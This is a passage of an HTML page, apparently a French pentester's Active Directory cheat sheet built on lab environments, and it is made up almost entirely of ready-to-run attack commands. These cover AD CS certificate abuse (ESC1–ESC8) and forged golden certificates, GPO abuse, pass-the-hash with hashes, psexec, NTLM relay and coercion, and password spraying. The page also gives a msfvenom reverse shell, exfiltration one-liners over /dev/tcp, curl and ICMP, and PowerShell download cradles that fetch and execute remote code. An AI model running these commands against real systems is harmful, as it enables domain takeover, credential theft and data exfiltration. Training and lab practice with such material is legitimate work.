+<pre class="bash"><code>certipy-ad find -u &#39;svc_ca&#39; -p &#39;Welcome2025!@&#39; -dc-ip &quot;10.0.30.32&quot; -vulnerable -enable
+nxc ldap anomaly-dc.anomaly.hsm -k --use-kcache -M certipy-find
+# ESC1
+certipy-ad req -u &#39;aarti@ignite.local&#39; -p &#39;Password@1&#39; -dc-ip 192.168.1.48 -ca ignite-DC1-CA -target &#39;dc.ignite.local&#39; -template &#39;Custom_ESC1&#39; -upn &#39;administrator@ignite.local&#39;
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.48</code></pre>
+<h3 id="ca-volée-golden-certificate">CA volée → Golden Certificate</h3>
+<pre class="bash"><code>certipy ca -backup -ca &quot;tri-CA&quot; -username &quot;m.pearson@tri.lab&quot; -password &quot;REDACTED&quot; -dc-ip &quot;10.0.30.244&quot; -target SWIM-SRV
+certipy forge -ca-pfx &quot;CA.pfx&quot; -upn &quot;administrator@corp.local&quot; -subject &quot;CN=Administrator,CN=Users,DC=CORP,DC=LOCAL&quot;
+certipy forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109
+certipy-ad auth -pfx j.reed_adm_forged.pfx -ldap-shell -dc-ip 10.1.220.10</code></pre>
+<p>Le détail complet ESC1→ESC8 est documenté dans la section <strong>AD CS</strong> ci-dessous.</p>
+<h2 id="ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</h2>
+<h3 id="énumération-de-linfrastructure-ad-cs">Énumération de l’infrastructure AD CS</h3>
+<p>Deux outils : <strong>Certipy</strong> (Python) et <strong>Certify</strong> (C#). Ils interrogent LDAP pour cartographier les autorités de certification, les templates et leurs propriétés (droits <code>enroll</code>/<code>autoenroll</code>, contraintes <em>Subject Name</em>, EKU).</p>
+<pre class="bash"><code>certipy find -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; -dc-ip &quot;$DC_IP&quot; -vulnerable -enable
+Certify.exe find /vulnerable</code></pre>
+<p>Les résultats peuvent être importés dans <strong>BloodHound</strong> pour corréler AD CS avec les chemins de privilèges.</p>
+<h3 id="esc1-usurpation-via-san-arbitraire">ESC1 – Usurpation via SAN arbitraire</h3>
+<p>Le template autorise le demandeur à définir lui-même le SAN (<code>mspki-certificate-name-flag</code> = <code>EnrolleeSuppliesSubject</code>), avec enrollment ouvert, sans Manager Approval, EKU <em>Client Authentication</em>.</p>
+<pre class="bash"><code>certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -dc-ip &quot;$DC_IP&quot; -target &quot;$ADCS_HOST&quot; \
+  -ca &#39;&lt;CA NAME&gt;&#39; -template &#39;ESC1&#39; -upn &#39;administrator@essos.local&#39;
+openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem
+certipy auth -pfx administrator.pfx -dc-ip 10.6.10.12</code></pre>
+<h3 id="esc2-certificat-any-purpose">ESC2 – Certificat <em>Any Purpose</em></h3>
+<p>Template avec EKU <em>Any Purpose</em> (ou aucun EKU) → certificat passe-partout utilisable comme <em>Certificate Request Agent</em>.</p>
+<pre class="bash"><code>certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template ESC2 -ca &quot;$CA-NAME&quot;
+certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template User \
+  -ca &quot;$CA-NAME&quot; -on-behalf-of &#39;essos\administrator&#39; -pfx khal.drogo.pfx</code></pre>
+<h3 id="esc3-deux-templates-request-agent">ESC3 – Deux templates (Request Agent)</h3>
+<pre class="bash"><code>certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template ESC3-CRA -ca &quot;&lt;CA-NAME&gt;&quot;
+certipy req -u &quot;$USER&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template ESC3 \
+  -ca ESSOS-CA -on-behalf-of &#39;essos\administrator&#39; -pfx esc2.pfx</code></pre>
+<h3 id="esc4-permissions-faibles-sur-un-template">ESC4 – Permissions faibles sur un template</h3>
+<p>Détection BloodHound + reconfiguration façon ESC1 :</p>
+<pre class="cypher"><code>MATCH p=shortestPath((g)-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]-&gt;(n:GPO))
+WHERE g&lt;&gt;n AND n.type = &#39;Certificate Template&#39; AND n.Enabled = true
+RETURN p</code></pre>
+<pre class="bash"><code>certipy template -u &quot;$USER&quot; -p &quot;$PASS&quot; -template ESC4 -write-default-configuration -dc-ip 10.6.10.12
+certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -dc-ip &quot;$DC_IP&quot; -target &quot;$ADCS_HOST&quot; -ca &#39;ESSOS-CA&#39; -template &#39;ESC4&#39; -upn &#39;administrator@essos.local&#39;
+# Restauration après test
+certipy template -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -template ESC4 -write-configuration &lt;backup-ESC4-file&gt;.json -dc-ip 10.6.10.12</code></pre>
+<h3 id="esc5-golden-certificate-compromission-ca">ESC5 – Golden Certificate (compromission CA)</h3>
+<pre class="bash"><code>certipy ca -backup -u &#39;Administrator&#39; -hashes &#39;:&lt;redacted&gt;&#39; -ca &#39;ESSOS-CA&#39; -target &lt;CA-SERVER-IP&gt;
+certipy forge -ca-pfx ESSOS-CA.pfx -upn administrator@essos.local -crl &#39;ldap:///&#39;</code></pre>
+<h3 id="esc6-editf_attributesubjectaltname2">ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2</h3>
+<pre class="bash"><code>certipy req -u &quot;$USER@$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template User -ca ESSOS-CA -upn administrator@essos.local -dc-ip &quot;$DC_IP&quot;
+# Remédiation
+certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+net stop certsvc &amp;&amp; net start certsvc</code></pre>
+<blockquote>
+<p>Fortement atténué depuis mai 2022 (KB5014754 / CVE-2022-26923 « Certifried »).</p>
+</blockquote>
+<h3 id="esc7-manage-ca-subca">ESC7 – Manage CA (SubCA)</h3>
+<pre class="bash"><code>certipy ca -u &#39;khal.drogo&#39;@&quot;$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -ca &quot;ESSOS-CA&quot; -enable-template &#39;SubCA&#39; -dc-ip &quot;$DC_IP&quot;
+certipy ca -u &quot;khal.drogo&quot;@&quot;$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -dc-ip 10.6.10.12 -ca &#39;ESSOS-CA&#39; -add-officer &quot;khal.drogo&quot;
+certipy ca  -u &quot;khal.drogo&quot;@&quot;$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -dc-ip 10.6.10.12 -ca &#39;ESSOS-CA&#39; -issue-request &#39;58&#39;
+certipy req -u &quot;khal.drogo&quot;@&quot;$DOMAIN&quot; -p &quot;$PASS&quot; -target &quot;$ADCS_HOST&quot; -template SubCA -ca ESSOS-CA -dc-ip 10.6.10.12 -retrieve &#39;58&#39;</code></pre>
+<h3 id="esc8-ntlm-relay-sur-web-enrollment">ESC8 – NTLM Relay sur Web Enrollment</h3>
+<pre class="bash"><code>certipy relay -target http://10.6.10.23 -template &#39;DomainController&#39;
+nxc smb &lt;DC-IP&gt; -M coerce_plus -o LISTENER=&quot;$ATTACKER_IP&quot;
+certipy auth -pfx domain-controller.pfx -dc-ip 10.6.10.12
+secretsdump -just-dc-user administrator -hashes :&quot;&lt;NT_HASH&gt;&quot; &quot;$DOMAIN&quot;/&quot;&lt;DC_NAME&gt;$&quot;@&quot;10.6.10.12&quot;</code></pre>
+<blockquote>
+<p><strong>Remédiation</strong> : désactiver le Web Enrollment inutile, activer <strong>EPA</strong> (HTTPS), désactiver NTLM sur les serveurs AD CS. Voir KB5005413.</p>
+</blockquote>
+<h2 id="gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</h2>
+<pre class="bash"><code># Ajoute l&#39;utilisateur &quot;john&quot; aux administrateurs locaux (mot de passe : H4x00r123..)
+pygpoabuse.py hsm.local/bbarkinson -hashes :&lt;redacted&gt; -gpo-id &quot;526CDF3A-10B6-4B00-BCFA-36E59DCD71A2&quot; -dc-ip 10.1.50.226 -f
+# Nettoyage
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id &quot;12345677-ABCD-9876-ABCD-123456789012&quot; --cleanup</code></pre>
+<h2 id="pass-the-hash-pth">Pass the Hash (PtH)</h2>
+<pre class="bash"><code># Si connexion directe impossible, essayer C$
+impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.78.141
+# Changer le mot de passe admin via nxc
+nxc smb 10.1.217.65 -u administrator -H &#39;&lt;redacted&gt;&#39; --local-auth --exec-method=smbexec -X &#39;net user administrator Password123!&#39;</code></pre>
+<h2 id="psexec">PSExec</h2>
+<pre class="bash"><code>impacket-psexec administrator@10.0.30.32 -hashes aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a</code></pre>
+<h2 id="smb-sans-signature-relais">SMB sans signature (relais)</h2>
+<pre class="bash"><code>nxc smb targets.txt --gen-relay-list nosigning.txt</code></pre>
+<h2 id="ntlm-theft">NTLM theft</h2>
+<pre class="bash"><code># https://github.com/Greenwolf/ntlm_theft
+ntlm_theft.py --generate modern --server 10.200.27.253 --filename &quot;bob&quot;</code></pre>
+<h2 id="password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</h2>
+<p>Script Python maison (requests_ntlm) qui pulvérise un mot de passe sur une liste d’utilisateurs :</p>
+<pre class="bash"><code>python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/</code></pre>
+<h2 id="reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</h2>
+<pre class="bash"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+sudo nc -nvlp 53</code></pre>
+<h2 id="exfiltration-canaux-variés">Exfiltration (canaux variés)</h2>
+<pre class="bash"><code># TCP socket
+tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.0.133/8080
+# SSH
+tar cf - task5/ | ssh thm@jump.thm.com &quot;cd /tmp/; tar xpf -&quot;
+# HTTP
+curl --data &quot;file=$(tar zcf - task6 | base64)&quot; http://web.thm.com/contact.php
+# ICMP (metasploit auxiliary/server/icmp_exfil)
+ping 10.10.77.97 -c 1 -p 74686d3a7472796861636b6d650a</code></pre>
+<h2 id="évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</h2>
+<pre class="bash"><code>pwsh -c &quot;iex (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c $LHOST -p $LPORT -e cmd.exe -ge&quot; &gt; /home/$rshell
+# ex.bat
+START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString(&#39;http://10.8.211.1:9000/shell-49731.txt&#39;);iex &#39;powershell -E $code&#39;</code></pre>
+<h2 id="génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</h2>
+<p><a href="https://github.com/LoGan070raGnaR/UserlistGenerator" target="_blank" rel="noopener noreferrer">UserlistGenerator</a> — génère des permutations de noms pour le brute-force (compatible Kerbrute).</p>
+<h2 id="windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</h2>
+<p>Vecteurs classiques testés avec <code>accesschk.exe</code> / <code>sc qc</code> :</p>
+<ul>
+<li><strong>Insecure Service Permissions</strong> (<code>SERVICE_CHANGE_CONFIG</code>) → <code>sc config &lt;svc&gt; binpath= "..."</code></li>
+<li><strong>Unquoted Service Path</strong> → déposer <code>Common.exe</code> dans un chemin non quoté</li>
+<li><strong>Weak Registry Permissions</strong> → écraser <code>ImagePath</code> du service</li>
+<li><strong>Insecure Service Executables</strong> → remplacer le binaire du service</li>
+<li><strong>AutoRuns</strong> modifiables, <strong>AlwaysInstallElevated</strong> (<code>msiexec /i reverse.msi</code>)</li>
+<li><strong>Passwords</strong> dans le registre / creds sauvegardés (<code>cmdkey /list</code>, <code>runas /savecred</code>)</li>
+<li><strong>SAM/SYSTEM</strong> dans <code>C:\Windows\Repair\</code> → <code>creddump7</code> puis crack Hashcat</li>
+<li><strong>Pass-the-Hash</strong> (<code>pth-winexe</code>), <strong>Scheduled Tasks</strong> modifiables</li>
+<li><strong>Token Impersonation</strong> : RoguePotato / PrintSpoofer via <code>PSExec64.exe -i -u "nt authority\local service"</code></li>
+</ul>
+</article>
+  <aside class="toc-rail"><div class="toc-title">On this page</div><ul>
+<li class="lvl2"><a href="#ère-étape-découverte-réseau">1ère étape – Découverte réseau</a></li>
+<li class="lvl2"><a href="#bloodhound">BloodHound</a></li>
+<li class="lvl2"><a href="#enum-acl">Enum ACL</a></li>
+<li class="lvl2"><a href="#énumération-ldap">Énumération LDAP</a></li>
+<li class="lvl2"><a href="#domain-computers-abus-machineaccountquota">Domain computers (abus MachineAccountQuota)</a></li>
+<li class="lvl2"><a href="#ipc-null-session-enumération-sid">IPC$ / null session → enumération SID</a></li>
+<li class="lvl2"><a href="#kerberoasting-aveugle-blind-kerberoast">Kerberoasting aveugle (blind kerberoast)</a></li>
+<li class="lvl2"><a href="#exploit-krb5.keytab">Exploit krb5.keytab</a></li>
+<li class="lvl2"><a href="#force-change-password">Force Change Password</a></li>
+<li class="lvl2"><a href="#generic-all-abus-complet-sur-un-objet">Generic All (abus complet sur un objet)</a></li>
+<li class="lvl2"><a href="#genericwrite-targeted-kerberoast-shadow-credentials">GenericWrite → Targeted Kerberoast / Shadow Credentials</a></li>
+<li class="lvl2"><a href="#backup-operators-locally">Backup Operators (locally)</a></li>
+<li class="lvl2"><a href="#templates-ad-cs-rappel">Templates AD CS (rappel)</a></li>
+<li class="lvl2"><a href="#ad-cs-énumération-et-exploitation-esc1-esc8">AD CS – Énumération et exploitation (ESC1 → ESC8)</a></li>
+<li class="lvl2"><a href="#gpo-abuse-privilege-escalation">GPO Abuse – Privilege Escalation</a></li>
+<li class="lvl2"><a href="#pass-the-hash-pth">Pass the Hash (PtH)</a></li>
+<li class="lvl2"><a href="#psexec">PSExec</a></li>
+<li class="lvl2"><a href="#smb-sans-signature-relais">SMB sans signature (relais)</a></li>
+<li class="lvl2"><a href="#ntlm-theft">NTLM theft</a></li>
+<li class="lvl2"><a href="#password-spraying-ntlm-http">Password Spraying (NTLM HTTP)</a></li>
+<li class="lvl2"><a href="#reverse-shell-windows-msfvenom-smb">Reverse shell Windows (msfvenom + SMB)</a></li>
+<li class="lvl2"><a href="#exfiltration-canaux-variés">Exfiltration (canaux variés)</a></li>
+<li class="lvl2"><a href="#évasion-av-powercat-download-cradle">Évasion AV (powercat / download-cradle)</a></li>
+<li class="lvl2"><a href="#génération-de-listes-dutilisateurs">Génération de listes d’utilisateurs</a></li>
+<li class="lvl2"><a href="#windows-privesc-résumé-des-vecteurs">Windows PrivEsc (résumé des vecteurs)</a></li>
+</ul></aside>
+</div>
+
+</main>
+</div>
+<button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">🌙</button>
+<button class="totop" id="toTop" onclick="scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/fulltext-index.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
